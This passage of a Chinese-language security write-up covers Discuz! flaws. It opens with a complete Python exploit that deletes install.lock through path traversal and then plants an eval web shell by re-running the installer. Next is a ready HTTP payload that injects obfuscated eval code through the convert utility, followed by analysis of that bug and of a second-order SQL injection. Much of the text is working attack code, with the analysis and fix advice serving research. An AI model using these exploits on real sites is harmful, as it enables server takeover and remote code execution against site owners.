+<span class="n">db_name</span> <span class="o">=</span> <span class="s1">''</span>
+<span class="c1">#################################################</span>
+
+<span class="n">path</span> <span class="o">=</span> <span class="s1">'/home.php?mod=spacecp&amp;ac=profile&amp;op=base'</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="n">path</span>
+
+<span class="n">sess</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span>
+    <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'</span><span class="p">,</span>
+    <span class="s1">'Accept'</span><span class="p">:</span> <span class="s1">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span><span class="p">,</span>
+    <span class="s1">'Referer'</span><span class="p">:</span> <span class="n">url</span><span class="p">})</span>
+
+
+<span class="c1"># sess.proxies.update({'http': 'socks5://localhost:1080'})</span>
+<span class="c1"># sess.proxies.update({'http': 'http://localhost:8080'})</span>
+
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="n">sess</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">'Cookie'</span><span class="p">:</span> <span class="n">cookie</span><span class="p">})</span>
+
+
+<span class="k">def</span> <span class="nf">get_form_hash</span><span class="p">():</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">'"member.php\?mod=logging&amp;amp;action=logout&amp;amp;formhash=(.*?)"'</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">formhash</span><span class="p">,</span> <span class="n">file_to_delete</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'formhash'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">formhash</span><span class="p">),</span>
+        <span class="s1">'profilesubmit'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s1">'true'</span><span class="p">),</span>
+        <span class="s1">'birthprovince'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">file_to_delete</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">'parent.show_success'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">'tamperred successfully'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">True</span>
+
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">formhash</span><span class="p">,</span> <span class="nb">file</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">tamper</span><span class="p">(</span><span class="n">formhash</span><span class="p">,</span> <span class="nb">file</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="n">image</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg=='</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'formhash'</span><span class="p">:</span> <span class="n">formhash</span><span class="p">,</span>
+        <span class="s1">'profilesubmit'</span><span class="p">:</span> <span class="s1">'true'</span>
+    <span class="p">}</span>
+    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'birthprovince'</span><span class="p">:</span> <span class="p">(</span><span class="s1">'image.png'</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">image</span><span class="p">),</span> <span class="s1">'image/png'</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">'parent.show_success'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">'delete {} successfully'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">file</span><span class="p">))</span>
+        <span class="k">return</span> <span class="bp">True</span>
+
+
+<span class="k">def</span> <span class="nf">getshell</span><span class="p">():</span>
+    <span class="n">install_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s1">'/install/index.php'</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">install_url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">'安装向导'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">'install directory not exists'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="n">table_prefix</span> <span class="o">=</span> <span class="s2">"x');@eval($_POST[{}]);('"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">shell_password</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'step'</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
+        <span class="s1">'install_ucenter'</span><span class="p">:</span> <span class="s1">'yes'</span><span class="p">,</span>
+        <span class="s1">'dbinfo[dbhost]'</span><span class="p">:</span> <span class="n">db_host</span><span class="p">,</span>
+        <span class="s1">'dbinfo[dbname]'</span><span class="p">:</span> <span class="n">db_name</span><span class="p">,</span>
+        <span class="s1">'dbinfo[dbuser]'</span><span class="p">:</span> <span class="n">db_user</span><span class="p">,</span>
+        <span class="s1">'dbinfo[dbpw]'</span><span class="p">:</span> <span class="n">db_pw</span><span class="p">,</span>
+        <span class="s1">'dbinfo[tablepre]'</span><span class="p">:</span> <span class="n">table_prefix</span><span class="p">,</span>
+        <span class="s1">'dbinfo[adminemail]'</span><span class="p">:</span> <span class="s1">'admin@admin.com'</span><span class="p">,</span>
+        <span class="s1">'admininfo[username]'</span><span class="p">:</span> <span class="s1">'admin'</span><span class="p">,</span>
+        <span class="s1">'admininfo[password]'</span><span class="p">:</span> <span class="s1">'admin'</span><span class="p">,</span>
+        <span class="s1">'admininfo[password2]'</span><span class="p">:</span> <span class="s1">'admin'</span><span class="p">,</span>
+        <span class="s1">'admininfo[email]'</span><span class="p">:</span> <span class="s1">'admin@admin.com'</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">install_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">'建立数据表 CREATE TABLE'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">'write shell failed'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">'shell: {}/config/config_ucenter.php'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">'password: {}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">shell_password</span><span class="p">))</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="n">login</span><span class="p">()</span>
+    <span class="n">form_hash</span> <span class="o">=</span> <span class="n">get_form_hash</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">form_hash</span><span class="p">:</span>
+        <span class="n">delete</span><span class="p">(</span><span class="n">form_hash</span><span class="p">,</span> <span class="s1">'../../../data/install.lock'</span><span class="p">)</span>
+        <span class="n">getshell</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">'failed'</span><span class="p">)</span>
+</pre></div>
+<h2 data-content="1" id="6020d7f61a22a00b3a11b61ac1a7a908">Dz全版本，版本转换功能导致Getshell</h2>
+<h3 data-content="1" id="056e3e7ceed877524fbb3fe1a4ee9248">1、简述</h3>
+<p>存在问题的代码在<code>/utility/convert/</code>目录下，这部分的功能主要是用于Dz系列产品升级/转换。</p>
+<p><strong>影响范围：</strong>全版本</p>
+<p><strong>条件：</strong>存在<code>/utility/convert/</code>目录和相应功能。</p>
+<h3 data-content="1" id="0633fb8632e9b785cc550705ffff9614">2、复现环境</h3>
+<p>同上，目前gitee最新版代码依然存在该漏洞。</p>
+<h3 data-content="1" id="584cde186043e7e8f855e2829af0690d">3、漏洞复现</h3>
+<p>在产品升级/转换-&gt;选择产品转换程序 -&gt;设置服务器信息 这里抓包，</p>
+<p>payload：</p>
+<pre><code>POST /dz/utility/convert/index.php HTTP/1.1
+Host: 127.0.0.1:8001
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 278
+Origin: http://127.0.0.1:8001
+Connection: close
+Referer: http://127.0.0.1:8001/dz/utility/convert/index.php
+Upgrade-Insecure-Requests: 1
+
+a=config&amp;source=d7.2_x1.5&amp;submit=yes&amp;newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(108).CHR(97).CHR(110).CHR(118).CHR(110).CHR(97).CHR(108).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205100-c660aab6-70f2-1.png"/></p>
+<h3 data-content="1" id="c79e1458dc77e19cb8239d3763eb6a7d">4、漏洞分析</h3>
+<p>入口<code>utility/convert/index.php</code></p>
+<div class="highlight"><pre><span></span><span class="x">require './include/common.inc.php';</span>
+
+<span class="x">$action = getgpc('a');</span>
+<span class="x">$action = empty($action) ? getgpc('action') : $action;</span>
+<span class="x">$source = getgpc('source') ? getgpc('source') : getgpc('s');</span>
+</pre></div>
+<p>取<code>$_POST['a']</code>,直接赋值给<code>$action</code>，此时<code>$action = config</code>;</p>
+<div class="highlight"><pre><span></span><span class="x">} elseif($action == 'config' || CONFIG_EMPTY) {      </span>
+<span class="x">    require DISCUZ_ROOT.'./include/do_config.inc.php';  </span>
+<span class="x">} elseif($action == 'setting') {</span>
+</pre></div>
+<p>满足条件，引入<code>./include/do_config.inc.php</code></p>
+<div class="highlight"><pre><span></span><span class="x">@touch($configfile);</span>
+<span class="x"> ......</span>
+<span class="x">if(submitcheck()) {</span>
+<span class="x">    $newconfig = getgpc('newconfig');</span>
+<span class="x">    if(is_array($newconfig)) {</span>
+<span class="x">        $checkarray = $setting['config']['ucenter'] ? array('source', 'target', 'ucenter') : array('source', 'target');</span>
+<span class="x">        foreach ($checkarray as $key) {</span>
+<span class="x">      ......</span>
+<span class="x">    }</span>
+<span class="x">    save_config_file($configfile, $newconfig, $config_default);</span>
+</pre></div>
+<p><code>$newconfig</code>从<code>$_POST[newconfig]</code>获取数据，<code>save_config_file</code>函数保将<code>$newconfig</code>保存到<code>$configfile</code>文件中，即<code>config.inc.php</code>文件。跟进该函数。</p>
+<div class="highlight"><pre><span></span><span class="x">function save_config_file($filename, $config, $default) {</span>
+<span class="x">    $config = setdefault($config, $default);// 将$config中的空白项用 $default 中对应项的值填充</span>
+<span class="x">    $date = gmdate("Y-m-d H:i:s", time() + 3600 * 8);</span>
+<span class="x">    $year = date('Y');</span>
+<span class="x">    $content = &lt;&lt;&lt;EOT</span>
+<span class="cp">&lt;?php</span>
+
+
+<span class="nx">\</span><span class="nv">$_config</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+
+<span class="nx">EOT</span><span class="p">;</span>
+    <span class="nv">$content</span> <span class="o">.=</span> <span class="nx">getvars</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'_config'</span> <span class="o">=&gt;</span> <span class="nv">$config</span><span class="p">));</span>
+    <span class="nv">$content</span> <span class="o">.=</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">// "</span><span class="o">.</span><span class="nb">str_pad</span><span class="p">(</span><span class="s1">'  THE END  '</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">,</span> <span class="nx">STR_PAD_BOTH</span><span class="p">)</span><span class="o">.</span><span class="s2">" //</span><span class="se">\r\n\r\n</span><span class="s2">?&gt;"</span><span class="p">;</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>getvars函数处理，此时的<code>$config</code> = <code>$newconfig+config.default.php对应项的补充</code>。看一下getvars函数：</p>
+<div class="highlight"><pre><span></span><span class="x">function getvars($data, $type = 'VAR') {</span>
+<span class="x">    $evaluate = '';</span>
+<span class="x">    foreach($data as $key =&gt; $val) {</span>
+<span class="x">        if(!preg_match("/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/", $key)) {</span>
+<span class="x">            continue;</span>
+<span class="x">        }</span>
+<span class="x">        if(is_array($val)) {</span>
+<span class="x">            $evaluate .= buildarray($val, 0, "\${$key}")."\r\n";</span>
+<span class="x">        } else {</span>
+<span class="x">            $val = addcslashes($val, '\'\\');</span>
+<span class="x">            $evaluate .= $type == 'VAR' ? "\$$key = '$val';\n" : "define('".strtoupper($key)."', '$val');\n";</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">    return $evaluate;</span>
+<span class="x">}</span>
+</pre></div>
+<p>满足if条件会执行<code>buildarray</code>函数，此时<code>$key=_config</code>，<code>$val</code>=上面的<code>$config</code>。最终造成写入的在该函数中（update.php 2206行）：</p>
+<div class="highlight"><pre><span></span><span class="x">foreach ($array as $key =&gt; $val) {</span>
+<span class="x">        if($level == 0) {</span>
+<span class="x">            //str_pad — 使用另一个字符串填充字符串为指定长度</span>
+<span class="x">            // 第一个参数是要输出的字符串，指定长度为50，用'-'填充，居中</span>
+<span class="x">            $newline = str_pad('  CONFIG '.strtoupper($key).'  ', 50, '-', STR_PAD_BOTH);</span>
+<span class="x">            $return .= "\r\n// $newline //\r\n";</span>
+<span class="x">        }</span>
+</pre></div>
+<p>本意是使用<code>$config</code>数组的key作为每一块配置区域的"注释标题"，写入配置文件的$newline依赖于$key，而$key是攻击者可控的。</p>
+<p>未对输入数据进行正确的边界处理，导致可以插入换行符，逃离注释的作用范围，从而使输入数据转化为可执行代码。</p>
+<h3 data-content="1" id="7ff2f5163eff78e90aea271c3593c9ff">5、修复建议</h3>
+<p>update.php 2206行</p>
+<div class="highlight"><pre><span></span><span class="x">foreach ($array as $key =&gt; $val){ </span>
+<span class="x">    //过滤掉$key中的非字母、数字及下划线字符</span>
+</pre></div>
+<h2 data-content="1" id="63f0caeaddd4fdf6302fb39eb14ac8c4">全版本后台Sql注入</h2>
+<h3 data-content="1" id="3949e7f463fabcdca0321c0e011bc5ee">1、简述</h3>
+<p>Discuz! X系列全版本 截止到 Discuz! X3.4 R20191201 UTF-8</p>
+<p><strong>二次注入</strong></p>
+<p>利用条件有限，还是挺鸡肋的。</p>
+<h3 data-content="1" id="743e107ce7ad465fdaad5dd56a4c199c">2、复现环境</h3>
+<p>同上</p>
+<h3 data-content="1" id="211feb992ba432554ddcdf4ece7c1a94">3、漏洞复现</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205100-c69db03c-70f2-1.png"/></p>
+<p>报错注入：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205101-c6ff1dcc-70f2-1.png"/></p>
+<p>写文件：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205101-c7660ece-70f2-1.png"/></p>
+<h3 data-content="1" id="78334bfe56e5f5b6d92ca48317db7e34">4、漏洞分析</h3>
+<p>漏洞原因：经过addslashes存入文件中,从文件中取出字符,转义符号丢失，造成二次注入</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200328205102-c7915944-70f2-1.png"/></p>
+<p>由前几个的分析已经明白了dz的路由形式，此处的路由解析如下：<code>?action=xxx =&gt; ../admincp_xxx.php</code></p>
+<p>跟进<code>source/admincp/admincp_setting.php</code>，2566行，接收参数修改<code>UC_APPID</code>值。</p>
+<div class="highlight"><pre><span></span><span class="x">$configfile = str_replace("define('UC_APPID', '".addslashes(UC_APPID)."')", "define('UC_APPID', '".$settingnew['uc']['appid']."')", $configfile);</span>
+
+<span class="x">        $fp = fopen('./config/config_ucenter.php', 'w');</span>
+<span class="x">        if(!($fp = @fopen('./config/config_ucenter.php', 'w'))) {</span>
+<span class="x">            cpmsg('uc_config_write_error', '', 'error');</span>
+<span class="x">        }</span>
+<span class="x">        @fwrite($fp, trim($configfile));</span>
+<span class="x">        @fclose($fp);</span>
+</pre></div>
+<p>成功写入恶意<code>UC_APPID</code>后，执行更新读取新的配置信息，3415行：</p>
+<div class="highlight"><pre><span></span><span class="x">if($updatecache) {</span>
+
+<span class="x">        updatecache('setting');</span>
+</pre></div>
+<p>最后在<code>uc_client/model/base.php</code>的<code>note_exists</code>方法中触发注入</p>
+<div class="highlight"><pre><span></span><span class="x">function note_exists() {</span>
+<span class="x">        $noteexists = $this-&gt;db-&gt;result_first("SELECT value FROM ".UC_DBTABLEPRE."vars WHERE name='noteexists".UC_APPID."'");</span>
+<span class="x">        if(empty($noteexists)) {</span>
+<span class="x">            return FALSE;</span>
+<span class="x">        } else {</span>
+<span class="x">            return TRUE;</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+</pre></div>
+</div>
+</div>
